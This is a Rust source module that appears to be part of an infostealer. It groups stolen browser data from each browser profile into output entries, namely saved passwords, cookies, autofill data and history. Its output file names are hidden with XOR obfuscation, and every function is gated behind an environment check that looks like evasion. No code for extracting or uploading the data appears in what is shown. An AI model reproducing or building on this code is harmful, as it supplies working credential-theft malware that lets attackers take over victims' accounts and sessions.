use super::{env_configured, xor_str};

fn s_passwords_txt() -> String {
    xor_str(&[
        0x2A, 0x3B, 0x29, 0x29, 0x2D, 0x35, 0x28, 0x3E, 0x29, 0x74, 0x2E, 0x22, 0x2E,
    ])
}

fn s_cookies_txt() -> String {
    xor_str(&[0x39, 0x35, 0x35, 0x31, 0x33, 0x3F, 0x29, 0x74, 0x2E, 0x22, 0x2E])
}

fn s_autofill_txt() -> String {
    xor_str(&[0x3B, 0x2F, 0x2E, 0x35, 0x3C, 0x33, 0x36, 0x36, 0x74, 0x2E, 0x22, 0x2E])
}

fn s_history_txt() -> String {
    xor_str(&[0x32, 0x33, 0x29, 0x2E, 0x35, 0x28, 0x23, 0x74, 0x2E, 0x22, 0x2E])
}

fn s_hash() -> String {
    xor_str(&[0x79])
}

fn has_text(content: &str) -> bool {
    !content.trim().is_empty()
}

fn has_cookie_data(content: &str) -> bool {
    content.lines().any(|line| {
        let t = line.trim();
        !t.is_empty() && !t.starts_with(&s_hash())
    })
}

pub fn push_profile_bundle(
    results: &mut Vec<(String, String)>,
    browser: &str,
    profile: &str,
    passwords: Option<String>,
    cookies: Option<String>,
    autofill: Option<String>,
    history: Option<String>,
) {
    if !env_configured() {
        return;
    }

    let base = format!("{browser}/{profile}");

    if let Some(content) = passwords.filter(|c| has_text(c)) {
        results.push((format!("{}/{}", base, s_passwords_txt()), content));
    }
    if let Some(content) = cookies.filter(|c| has_cookie_data(c)) {
        results.push((format!("{}/{}", base, s_cookies_txt()), content));
    }
    if let Some(content) = autofill.filter(|c| has_text(c)) {
        results.push((format!("{}/{}", base, s_autofill_txt()), content));
    }
    if let Some(content) = history.filter(|c| has_text(c)) {
        results.push((format!("{}/{}", base, s_history_txt()), content));
    }
}

pub fn sort_entries(files: &mut [(String, String)]) {
    if !env_configured() {
        return;
    }

    files.sort_by(|a, b| a.0.cmp(&b.0));
}
